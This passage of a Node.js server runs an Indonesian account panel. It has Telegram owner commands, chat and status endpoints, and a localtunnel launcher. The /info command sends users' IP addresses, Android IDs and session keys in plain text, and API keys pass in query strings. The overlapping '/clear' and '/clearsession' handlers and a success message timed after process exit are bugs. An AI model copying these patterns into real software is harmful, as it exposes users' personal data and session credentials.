  fs.writeFileSync("reset_result.txt", deleted.join("\n") || "Tidak ada akun dihapus.");

  return deleted;
}

// 🔘 Command reset dengan tombol konfirmasi
function registerResetButton(cmd, role) {
  bot.onText(new RegExp(`^\\/?${cmd}$`, "i"), async (msg) => {
    if (msg.from.id !== OWNER_ID) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

    const roleName = role === "all" ? "SEMUA AKUN" : `role *${role}*`;
    const opts = {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ Konfirmasi", callback_data: `confirm_${cmd}` }],
          [{ text: "❌ Batal", callback_data: "cancel_reset" }]
        ]
      }
    };
    bot.sendMessage(msg.chat.id, `⚠️ Apakah kamu yakin ingin menghapus ${roleName}?`, opts);
  });

  // Handle klik tombol konfirmasi
  bot.on("callback_query", async (query) => {
    const data = query.data;
    const fromId = query.from.id;
    const chatId = query.message.chat.id;

    if (data === `confirm_${cmd}`) {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }

      const deleted = doReset(role);
      const info = deleted.length > 0 ? `✅ ${deleted.length} akun dihapus.` : "ℹ️ Tidak ada akun yang dihapus.";

      await bot.sendDocument(chatId, "reset_result.txt", {
        caption: `*Berhasil menghapus ${deleted.length} akun*\n${role === "all" ? "🗑 Semua akun" : `🗑 Role: ${role}`}`,
        parse_mode: "Markdown"
      });
      return bot.answerCallbackQuery(query.id, { text: info });
    }

    if (data === "cancel_reset") {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }
      bot.answerCallbackQuery(query.id, { text: "❌ Dibatalkan." });
      bot.sendMessage(chatId, "🚫 Aksi reset dibatalkan.");
    }
  });
}

// 🔹 Daftarkan semua perintah
registerResetButton("resetakunowner", "owner");
registerResetButton("resetakunreseller", "reseller");
registerResetButton("resetakunvip", "vip");
registerResetButton("resetakunmember", "member");
registerResetButton("resetall", "all");

// === FITUR /INFO <username> ===
bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (fromId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const username = match[1].trim().toLowerCase();

  try {
    if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");

    const db = JSON.parse(fs.readFileSync("database.json"));
    const keys = JSON.parse(fs.readFileSync("keyList.json"));

    // cari data akun
    const dbUser = db.find(u => (u.username || "").toLowerCase() === username);
    const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);

    if (!dbUser && !keyUser) {
      return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    // ambil data dari database.json
    const role = dbUser?.role || "member";
    const expired = dbUser?.expiredDate || "Tidak ada";
    const lastSend = dbUser?.lastSend
      ? new Date(dbUser.lastSend).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum pernah";

    // ambil data dari keyList.json
    const lastLogin = keyUser?.lastLogin
      ? new Date(keyUser.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum login";
    const ip = keyUser?.ipAddress || "Tidak diketahui";
    const android = keyUser?.androidId || "-";
    const session = keyUser?.sessionKey || "-";

    const info = `
*INFORMASI AKUN*

*Username:* ${dbUser?.username || keyUser?.username || username}
*Role:* ${role}
*Expired Date:* ${expired}
*Terakhir Kirim:* ${lastSend}
*Terakhir Login:* ${lastLogin}
*IP Address:* ${ip}
*Android ID:* ${android}
*Session Key:* \`${session}\`
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error info:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data akun.");
  }
});

// === FITUR /STATS - STATUS BOT & USER ===
const startTime = Date.now();

function getUptime() {
  const seconds = Math.floor((Date.now() - startTime) / 1000);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}j ${m}m ${s}d`;
}

bot.onText(/^\/?(stats|status)$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    // === Load database user ===
    let users = [];
    if (fs.existsSync("database.json")) {
      users = JSON.parse(fs.readFileSync("database.json"));
    }

    const totalUser = users.length;
    const countRole = (role) => users.filter(u => (u.role || "member") === role).length;

    const owners = countRole("owner");
    const resellers = countRole("reseller");
    const vips = countRole("vip");
    const members = countRole("member");

    // === Cek session WhatsApp aktif (jika pakai Baileys MD) ===
    const connectedMess = Object.keys(mess || {}).length || 0;
    const connectedBiz = Object.keys(biz || {}).length || 0;
    const connectedNumbers = Object.keys(activeConnections || {}).length || 0;

    // === Buat tampilan stats ===
    const info = `
*Bot Statistics*

*Status:* Online
*Uptime:* ${getUptime()}

*User Data*
• Total User: ${totalUser}
• Owner: ${owners}
• Reseller: ${resellers}
• VIP: ${vips}
• Member: ${members}

*WhatsApp Session*
• Messenger: ${connectedMess}
• Business: ${connectedBiz}
• Active Numbers: ${connectedNumbers}

*Tanggal:* ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error stats:", err);
    bot.sendMessage(chatId, "❌ Gagal mengambil data stats.");
  }
});

bot.onText(/^\/?statususer$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const dbPath = "./database.json";
    const logPath = "logUser.txt";

    if (!fs.existsSync(dbPath)) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    const db = JSON.parse(fs.readFileSync(dbPath, "utf-8"));

    if (!fs.existsSync(logPath)) return bot.sendMessage(chatId, "📊 Belum ada data log pembuatan akun.");

    const logs = fs.readFileSync(logPath, "utf-8").split("\n").filter(Boolean);

    // Hitung berapa kali setiap user membuat akun
    const countMap = {};
    for (const line of logs) {
      const match = line.match(/^(\S+)\s+Created\s+/);
      if (match) {
        const creator = match[1];
        countMap[creator] = (countMap[creator] || 0) + 1;
      }
    }

    // Gabungkan data username, role, dan total akun dibuat
    const list = db.map(u => ({
      username: u.username,
      role: u.role || "member",
      total: countMap[u.username] || 0
    }));

    // Urutkan dari yang paling banyak membuat akun
    list.sort((a, b) => b.total - a.total);

    // Format teks file
    let teks = `📊 STATUS USER & AKTIVITAS BOT\nGenerated: ${new Date().toLocaleString()}\n\n`;
    teks += `Username | Role | Total Akun Dibuat\n`;
    teks += `-------------------------------------\n`;

    for (const u of list) {
      teks += `${u.username} | ${u.role} | ${u.total}\n`;
    }

    const filePath = "./statususer.txt";
    fs.writeFileSync(filePath, teks);

    await bot.sendDocument(chatId, filePath, {
      caption: "📄 Berikut status semua user & jumlah akun yang telah mereka buat."
    });

    fs.unlinkSync(filePath); // hapus file setelah dikirim
  } catch (err) {
    console.error("[❌ STATUSUSER ERROR]", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat laporan status user.");
  }
});

const SESSION_PATH = path.join(__dirname, "permenmd");

// === Fitur /clearsession ===
bot.onText(/^\/?clearsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder session tidak ditemukan.");
    }

    // Hapus seluruh isi folder permenmd
    fs.rmSync(SESSION_PATH, { recursive: true, force: true });
    fs.mkdirSync(SESSION_PATH, { recursive: true }); // buat ulang folder kosong

    bot.sendMessage(chatId, "✅ Semua session dihapus dengan sukses (folder *permenmd* dikosongkan).");
    console.log("🧹 Semua session telah dihapus melalui /clearsession");
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Gagal menghapus semua session.");
  }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder 'permenmd' tidak ditemukan.");
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      // Cek apakah folder berisi file .json
      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    bot.sendMessage(chatId, `Berhasil menghapus ${deletedCount} folder session yang tidak berisi file .json.`);
    console.log(`🧹 ${deletedCount} folder session kosong dihapus.`);
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Terjadi error saat membersihkan session kosong.");
  }
});

// ===== FITUR RESTART MANUAL (SAMA GAYA DENGAN AUTO RESTART) =====
bot.onText(/^\/?restart$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  sendToGroupsUtama("🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...", { parse_mode: "Markdown" });
  console.log("♻️ Restart manual dijalankan...");

  setTimeout(() => {
    sendToGroupsUtama("🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!", { parse_mode: "Markdown" });
  }, 8000); // kirim pesan sukses setelah 8 detik

  // Tunggu 5 detik lalu restart
  setTimeout(() => {
    process.exit(0);
  }, 5000);
});

// ══════════════════════════════════════════════════════════
//  GROUP CHAT
// ══════════════════════════════════════════════════════════

// GET /groupchat/getMessages?key=&room=&lastId=
app.get('/groupchat/getMessages', (req, res) => {
  const { key, room = 'global', lastId = '0' } = req.query;
  const user = getUser(key);
  if (!user) return res.json({ valid: false, message: 'Session tidak valid' });

  const all = readJSON(CHAT_DB, []);
  const data = all.filter(m => m.room === room && m.id > parseInt(lastId));
  res.json({ valid: true, data });
});

// POST /groupchat/sendMessage  body: { key, room, message }
app.post('/groupchat/sendMessage', express.json(), (req, res) => {
  const { key, room = 'global', message } = req.body || {};
  const user = getUser(key);
  if (!user) return res.json({ valid: false, message: 'Session tidak valid' });
  if (!message || !message.trim()) return res.json({ valid: false, message: 'Pesan kosong' });

  const all = readJSON(CHAT_DB, []);
  const newMsg = {
    id: (all.length ? Math.max(...all.map(m => m.id)) : 0) + 1,
    username: user.username,
    role: user.role || 'member',
    room,
    message: sanitize(message),
    type: 'text',
    edited: false,
    reactions: {},
    time: new Date().toISOString(),
  };
  all.push(newMsg);
  writeJSON(CHAT_DB, all);
  res.json({ valid: true, data: newMsg });
});

// POST /groupchat/editMessage  body: { key, messageId, message }
app.post('/groupchat/editMessage', express.json(), (req, res) => {
  const { key, messageId, message } = req.body || {};
  const user = getUser(key);
  if (!user) return res.json({ valid: false, message: 'Session tidak valid' });
  if (!messageId || !message || !message.trim()) return res.json({ valid: false, message: 'Data tidak lengkap' });

  const all = readJSON(CHAT_DB, []);
  const idx = all.findIndex(m => m.id === parseInt(messageId));
  if (idx === -1) return res.json({ valid: false, message: 'Pesan tidak ditemukan' });
  if (all[idx].username !== user.username) return res.json({ valid: false, message: 'Tidak boleh edit pesan orang lain' });

  all[idx].message = sanitize(message);
  all[idx].edited = true;
  writeJSON(CHAT_DB, all);
  res.json({ valid: true });
});

// POST /groupchat/reactMessage  body: { key, messageId, emoji }
app.post('/groupchat/reactMessage', express.json(), (req, res) => {
  const { key, messageId, emoji } = req.body || {};
  const user = getUser(key);
  if (!user) return res.json({ valid: false, message: 'Session tidak valid' });
  if (!messageId || !emoji) return res.json({ valid: false, message: 'Data tidak lengkap' });

  const all = readJSON(CHAT_DB, []);
  const idx = all.findIndex(m => m.id === parseInt(messageId));
  if (idx === -1) return res.json({ valid: false, message: 'Pesan tidak ditemukan' });

  if (!all[idx].reactions) all[idx].reactions = {};
  if (!all[idx].reactions[emoji]) all[idx].reactions[emoji] = [];

  const already = all[idx].reactions[emoji].includes(user.username);
  if (already) {
    all[idx].reactions[emoji] = all[idx].reactions[emoji].filter(u => u !== user.username);
    if (all[idx].reactions[emoji].length === 0) delete all[idx].reactions[emoji];
  } else {
    all[idx].reactions[emoji].push(user.username);
  }

  writeJSON(CHAT_DB, all);
  res.json({ valid: true, data: { action: already ? 'removed' : 'added' } });
});

// ══════════════════════════════════════════════════════════
//  PRIVATE CHAT
// ══════════════════════════════════════════════════════════

// GET /private/getUsers?key=
app.get('/private/getUsers', (req, res) => {
  const { key } = req.query;
  const user = getUser(key);
  if (!user) return res.json({ valid: false, message: 'Session tidak valid' });

  const keys = readJSON(KEY_FILE, []);
  const users = keys
    .filter(k => k.username !== user.username)
    .map(k => ({ username: k.username, role: k.role || 'member' }));
  res.json({ valid: true, data: users });
});

// GET /private/getConversations?key=
app.get('/private/getConversations', (req, res) => {
  const { key } = req.query;
  const user = getUser(key);
  if (!user) return res.json({ valid: false, message: 'Session tidak valid' });

  const all = readJSON(PRIVATE_DB, []);
  const mine = all.filter(m => m.from === user.username || m.to === user.username);

  const peers = {};
  mine.forEach(m => {
    const peer = m.from === user.username ? m.to : m.from;
    if (!peers[peer] || new Date(m.time) > new Date(peers[peer].time)) {
      peers[peer] = m;
    }
  });

  const convList = Object.keys(peers).map(peer => ({
    peer,
    lastMessage: peers[peer],
  }));

  convList.sort((a, b) => {
    const ta = a.lastMessage?.time ? new Date(a.lastMessage.time) : 0;
    const tb = b.lastMessage?.time ? new Date(b.lastMessage.time) : 0;
    return tb - ta;
  });

  res.json({ valid: true, data: convList });
});

// GET /private/getMessages?key=&withUser=&lastId=
app.get('/private/getMessages', (req, res) => {
  const { key, withUser, lastId = '0' } = req.query;
  const user = getUser(key);
  if (!user) return res.json({ valid: false, message: 'Session tidak valid' });
  if (!withUser) return res.json({ valid: false, message: 'withUser diperlukan' });

  const all = readJSON(PRIVATE_DB, []);
  const data = all.filter(m =>
    m.id > parseInt(lastId) &&
    ((m.from === user.username && m.to === withUser) ||
     (m.from === withUser && m.to === user.username))
  );
  res.json({ valid: true, data });
});

// POST /private/sendMessage  body: { key, to, message }
app.post('/private/sendMessage', express.json(), (req, res) => {
  const { key, to, message } = req.body || {};
  const user = getUser(key);
  if (!user)    return res.json({ valid: false, message: 'Session tidak valid' });
  if (!to)      return res.json({ valid: false, message: 'Penerima diperlukan' });
  if (!message) return res.json({ valid: false, message: 'Pesan kosong' });

  const targetExists = readJSON(KEY_FILE, []).find(k => k.username === to);
  if (!targetExists) return res.json({ valid: false, message: 'User tujuan tidak ditemukan' });

  if (isBlockedPair(user.username, to) || isBlockedPair(to, user.username)) {
    return res.json({ valid: false, message: 'Tidak bisa mengirim pesan, user ini diblokir' });
  }

  const all = readJSON(PRIVATE_DB, []);
  const newMsg = {
    id: (all.length ? Math.max(...all.map(m => m.id)) : 0) + 1,
    from: user.username,
    to,
    message: sanitize(message),
    type: 'text',
    edited: false,
    reactions: {},
    time: new Date().toISOString(),
  };
  all.push(newMsg);
  writeJSON(PRIVATE_DB, all);
  res.json({ valid: true, data: newMsg });
});

// POST /private/editMessage  body: { key, messageId, message }
app.post('/private/editMessage', express.json(), (req, res) => {
  const { key, messageId, message } = req.body || {};
  const user = getUser(key);
  if (!user) return res.json({ valid: false, message: 'Session tidak valid' });
  if (!messageId || !message || !message.trim()) return res.json({ valid: false, message: 'Data tidak lengkap' });

  const all = readJSON(PRIVATE_DB, []);
  const idx = all.findIndex(m => m.id === parseInt(messageId));
  if (idx === -1) return res.json({ valid: false, message: 'Pesan tidak ditemukan' });
  if (all[idx].from !== user.username) return res.json({ valid: false, message: 'Tidak boleh edit pesan orang lain' });

  all[idx].message = sanitize(message);
  all[idx].edited = true;
  writeJSON(PRIVATE_DB, all);
  res.json({ valid: true });
});

// POST /private/reactMessage  body: { key, messageId, emoji }
app.post('/private/reactMessage', express.json(), (req, res) => {
  const { key, messageId, emoji } = req.body || {};
  const user = getUser(key);
  if (!user) return res.json({ valid: false, message: 'Session tidak valid' });
  if (!messageId || !emoji) return res.json({ valid: false, message: 'Data tidak lengkap' });

  const all = readJSON(PRIVATE_DB, []);
  const idx = all.findIndex(m => m.id === parseInt(messageId));
  if (idx === -1) return res.json({ valid: false, message: 'Pesan tidak ditemukan' });

  if (!all[idx].reactions) all[idx].reactions = {};
  if (!all[idx].reactions[emoji]) all[idx].reactions[emoji] = [];

  const already = all[idx].reactions[emoji].includes(user.username);
  if (already) {
    all[idx].reactions[emoji] = all[idx].reactions[emoji].filter(u => u !== user.username);
    if (all[idx].reactions[emoji].length === 0) delete all[idx].reactions[emoji];
  } else {
    all[idx].reactions[emoji].push(user.username);
  }

  writeJSON(PRIVATE_DB, all);
  res.json({ valid: true, data: { action: already ? 'removed' : 'added' } });
});

// ══════════════════════════════════════════════════════════
//  BLOCK USER
// ══════════════════════════════════════════════════════════

// POST /private/blockUser  body: { key, target }
app.post('/private/blockUser', express.json(), (req, res) => {
  const { key, target } = req.body || {};
  const user = getUser(key);
  if (!user) return res.json({ valid: false, message: 'Session tidak valid' });
  if (!target) return res.json({ valid: false, message: 'Target diperlukan' });
  if (target === user.username) return res.json({ valid: false, message: 'Tidak bisa blokir diri sendiri' });

  const targetExists = readJSON(KEY_FILE, []).find(k => k.username === target);
  if (!targetExists) return res.json({ valid: false, message: 'User tidak ditemukan' });

  const all = readJSON(BLOCKED_DB, []);
  const already = all.find(b => b.blocker === user.username && b.blocked === target);
  if (!already) {
    all.push({ blocker: user.username, blocked: target, time: new Date().toISOString() });
    writeJSON(BLOCKED_DB, all);
  }
  res.json({ valid: true });
});

// POST /private/unblockUser  body: { key, target }
app.post('/private/unblockUser', express.json(), (req, res) => {
  const { key, target } = req.body || {};
  const user = getUser(key);
  if (!user) return res.json({ valid: false, message: 'Session tidak valid' });
  if (!target) return res.json({ valid: false, message: 'Target diperlukan' });

  let all = readJSON(BLOCKED_DB, []);
  all = all.filter(b => !(b.blocker === user.username && b.blocked === target));
  writeJSON(BLOCKED_DB, all);
  res.json({ valid: true });
});

// GET /private/getBlocked?key=
app.get('/private/getBlocked', (req, res) => {
  const { key } = req.query;
  const user = getUser(key);
  if (!user) return res.json({ valid: false, message: 'Session tidak valid' });

  const all = readJSON(BLOCKED_DB, []);
  const blocked = all.filter(b => b.blocker === user.username).map(b => b.blocked);
  res.json({ valid: true, data: blocked });
});

// ══════════════════════════════════════════════════════════
//  STATUS
// ══════════════════════════════════════════════════════════

// GET /status/getAll?key=
app.get('/status/getAll', (req, res) => {
  const { key } = req.query;
  const user = getUser(key);
  if (!user) return res.json({ valid: false, message: 'Session tidak valid' });

  const now = Date.now();
  const all = readJSON(STATUS_DB, []);
  const active = all.filter(s => (now - new Date(s.time).getTime()) < 24 * 60 * 60 * 1000);

  const grouped = {};
  active.forEach(s => {
    if (!grouped[s.username]) grouped[s.username] = { username: s.username, role: s.role, items: [] };
    grouped[s.username].items.push(s);
  });

  res.json({ valid: true, data: Object.values(grouped) });
});

// POST /status/post  body: { key, caption }
app.post('/status/post', express.json(), (req, res) => {
  const { key, caption = '' } = req.body || {};
  const user = getUser(key);
  if (!user) return res.json({ valid: false, message: 'Session tidak valid' });
  if (!caption.trim()) return res.json({ valid: false, message: 'Caption diperlukan' });

  const now = Date.now();
  const ONE_DAY_MS = 24 * 60 * 60 * 1000;
  let all = readJSON(STATUS_DB, []);
  all = all.filter(s => now - new Date(s.time).getTime() < ONE_DAY_MS);

  const newStatus = {
    id: Date.now(),
    username: user.username,
    role: user.role || 'member',
    type: 'text',
    caption: sanitize(caption),
    viewers: [],
    time: new Date().toISOString(),
  };

  all.push(newStatus);
  writeJSON(STATUS_DB, all);
  res.json({ valid: true, data: newStatus });
});

// POST /status/view  body: { key, statusId }
app.post('/status/view', express.json(), (req, res) => {
  const { key, statusId } = req.body || {};
  const user = getUser(key);
  if (!user) return res.json({ valid: false, message: 'Session tidak valid' });

  const all = readJSON(STATUS_DB, []);
  const idx = all.findIndex(s => s.id === parseInt(statusId));
  if (idx === -1) return res.json({ valid: false, message: 'Status tidak ditemukan' });

  if (!all[idx].viewers.includes(user.username)) {
    all[idx].viewers.push(user.username);
    writeJSON(STATUS_DB, all);
  }
  res.json({ valid: true });
});

// DELETE /status/delete?key=&statusId=
app.delete('/status/delete', (req, res) => {
  const { key, statusId } = req.query;
  const user = getUser(key);
  if (!user) return res.json({ valid: false, message: 'Session tidak valid' });

  let all = readJSON(STATUS_DB, []);
  const idx = all.findIndex(s => s.id === parseInt(statusId) && s.username === user.username);
  if (idx === -1) return res.json({ valid: false, message: 'Status tidak ditemukan atau bukan milik kamu' });

  all.splice(idx, 1);
  writeJSON(STATUS_DB, all);
  res.json({ valid: true });
});


// ===== AUTO KIRIM URL TUNNEL KE GRUP + PIN =====
let lastPinnedMsgIds = {}; // { groupId: messageId }

async function sendTunnelToGroups(tunnelUrl) {
  const allGroups = [...new Set([...ID_GROUP, ...ID_GROUP_UTAMA])];
  const text = `🌐 *XADOW PANEL ONLINE*\n\n` +
    `🔗 URL: ${tunnelUrl}\n\n` +
    `📋 Login:\n` +
    `• Username & Password sesuai akun masing-masing\n\n` +
    `⚠️ URL berubah tiap restart server`;

  for (const groupId of allGroups) {
    try {
      // Hapus pin lama kalau ada
      if (lastPinnedMsgIds[groupId]) {
        try {
          await bot.unpinChatMessage(groupId, { message_id: lastPinnedMsgIds[groupId] });
          await bot.deleteMessage(groupId, lastPinnedMsgIds[groupId]);
        } catch(_) {}
      }

      // Kirim pesan baru
      const sent = await bot.sendMessage(groupId, text, { parse_mode: 'Markdown' });

      // Pin pesan baru
      await bot.pinChatMessage(groupId, sent.message_id, { disable_notification: false });

      // Simpan message id untuk dihapus next restart
      lastPinnedMsgIds[groupId] = sent.message_id;

      console.log(`📌 URL tunnel dikirim & dipin ke grup ${groupId}`);
    } catch(e) {
      console.log(`⚠️ Gagal kirim ke grup ${groupId}:`, e.message);
    }
  }
}

// ===== TUNNEL PUBLIK via localtunnel + auto bypass =====
async function startTunnel() {
  try {
    let lt;
    try { lt = require('localtunnel'); } catch(_) {
      const { execSync } = require('child_process');
      execSync('npm install localtunnel --save', { stdio: 'ignore' });
      lt = require('localtunnel');
    }

    const tunnel = await lt({ port: PORT });
    const tunnelUrl = tunnel.url;

    // Auto-bypass halaman IP verify localtunnel
    // Caranya: hit endpoint /bypass dengan header khusus
    try {
      const http = require('http');
      const https = require('https');
      const urlObj = new URL(tunnelUrl);
      const client = urlObj.protocol === 'https:' ? https : http;
      client.get(tunnelUrl, {
        headers: {
          'bypass-tunnel-reminder': '1',
          'User-Agent': 'xadow-panel/1.0'
        }
      }, (res) => res.resume()).on('error', () => {});
    } catch(_) {}

    console.log(`\n🌐 ============================`);
    console.log(`🌐 TUNNEL URL: ${tunnelUrl}`);
    console.log(`🌐 Buka URL itu di browser`);
    console.log(`🌐 ============================\n`);

    // Kirim URL ke semua grup, pin pesan baru, hapus pin lama
    await sendTunnelToGroups(tunnelUrl);

    tunnel.on('error', () => {
      console.log('⚠️ Tunnel error, restart 10s...');
      setTimeout(startTunnel, 10000);
    });
    tunnel.on('close', () => {
      console.log('⚠️ Tunnel tutup, restart 10s...');
      setTimeout(startTunnel, 10000);
    });

  } catch(e) {
    console.log('⚠️ Tunnel gagal:', e.message, '— retry 15s');
    setTimeout(startTunnel, 15000);
  }
}

// ===== Start Express Server =====
app.listen(PORT, () => {
  console.log(`🚀 Server aktif di http://inipanelnyariostorepanel.mbgwowo.web.id:${PORT}`);
    startUserSessions();
    startTunnel();
});

// ===== AUTO RESTART PANEL DENGAN STATUS TELEGRAM =====
const RESTART_INTERVAL = 20 * 60 * 1000; // 20 menit

function kirimStatusServer(pesan) {
  try {
    sendToGroupsUtama(`🟣 *Status Panel:*\n${pesan}`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Gagal kirim status ke Telegram:", err.message);
  }
}

// Kirim notifikasi saat server aktif
kirimStatusServer("✅ Server aktif dan berjalan normal.");

// Kirim notifikasi sebelum restart
setInterval(() => {
  kirimStatusServer("♻️ Panel akan *restart otomatis* untuk menjaga kestabilan...");
  console.log("♻️ Auto restarting panel...");
  setTimeout(() => {
    process.exit(0); // memicu restart otomatis di panel
  }, 5000); // beri jeda 5 detik agar pesan terkirim dulu
}, RESTART_INTERVAL);